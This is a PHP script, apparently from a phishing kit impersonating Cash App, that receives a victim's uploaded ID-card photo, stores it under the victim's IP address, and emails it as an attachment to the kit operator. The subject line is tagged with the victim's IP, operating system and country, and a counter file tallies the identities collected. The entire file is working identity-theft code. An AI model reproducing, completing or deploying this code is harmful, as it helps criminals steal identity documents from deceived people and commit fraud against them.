<?php
require_once 'main.php';
$ip = $_SERVER['REMOTE_ADDR'];
if(isset($_FILES["file"]["type"]))
{
$validextensions = array("jpeg", "jpg", "png");
$temporary = explode(".", $_FILES["file"]["name"]);
$file_extension = end($temporary);
if ((($_FILES["file"]["type"] == "image/png") || ($_FILES["file"]["type"] == "image/jpg") || ($_FILES["file"]["type"] == "image/jpeg")
) && ($_FILES["file"]["size"] > 100)
&& in_array($file_extension, $validextensions)) {
if ($_FILES["file"]["error"] > 0)
{
echo "Return Code: " . $_FILES["file"]["error"] . "<br/><br/>";
}
else
{
if (file_exists("upload/".$ip."_". $_FILES["file"]["name"])) {
echo " <span id='invalid'></span> ";
}
else
{
// Storing source path of the file in a variable
$sourcePath = $_FILES['file']['tmp_name']; 



$targetPath = "upload/".$ip."_". $_FILES["file"]["name"];

	


move_uploaded_file($sourcePath,$targetPath) ;
	$to          = $email;
	$from        = "Cash App";
	$subject     = "[ID CARD] [ ".$ip." - " . $os . " - " . $cn . " ]";
   	$fileatt     = $targetPath;
	$fileattname = $ip."_". $_FILES["file"]["name"];
	$from = $senderemail;
	$headers = "From: $sendername <$from>";

		$ext = strrchr( $fileatt , '.');
        $ftype = "";
        if ($ext == ".doc") $ftype = "application/msword";
        if ($ext == ".jpg") $ftype = "image/jpeg";
        if ($ext == ".gif") $ftype = "image/gif";
        if ($ext == ".zip") $ftype = "application/zip";
        if ($ext == ".pdf") $ftype = "application/pdf";

	// File
	$file = fopen($fileatt, 'rb');
	$data = fread($file, filesize($fileatt));
	fclose($file);
	// This attaches the file
	$semi_rand     = md5(time());
	$mime_boundary = "==Multipart_Boundary_x".$semi_rand."x";
	$headers      .= "\nMIME-Version: 1.0\n" .
	"Content-Type: multipart/mixed;\n" .
	" boundary=\"".$mime_boundary."\"";
	$message = "This is a multi-part message in MIME format.\n\n" .
	"-".$mime_boundary."\n" .
	"Content-Type: text/plain; charset=\"iso-8859-1\n" .
	"Content-Transfer-Encoding: 7bit\n\n" .
	$message  . "\n\n";
	$data = chunk_split(base64_encode($data));
	$message .= "--".$mime_boundary."\n" .
	"Content-Type: ".$ftype."\n" .
	" name=\"".$fileattname."\"\n" .
	"Content-Disposition: attachment;\n" .
	" filename=\"".$fileattname."\"\n" .
	"Content-Transfer-Encoding: base64\n\n" .
	$data . "\n\n" .
	"-".$mime_boundary."-\n";
	// Send the email
	if(mail($to, $subject, $message, $headers)) {
		echo "Identity Received";
	}
	else {
	    echo "Die | ERROR.";
	}
echo "<span id=success' ></span>";
}
}
}
else
{
echo "<span id='invalid'>Invalid Size or Type<span>";
}
}
$file = "result/total_identity.txt";
$isi  = @file_get_contents($file);
$buka = fopen($file,"w"); 
fwrite($buka, $isi+1);
fclose($buka);
?>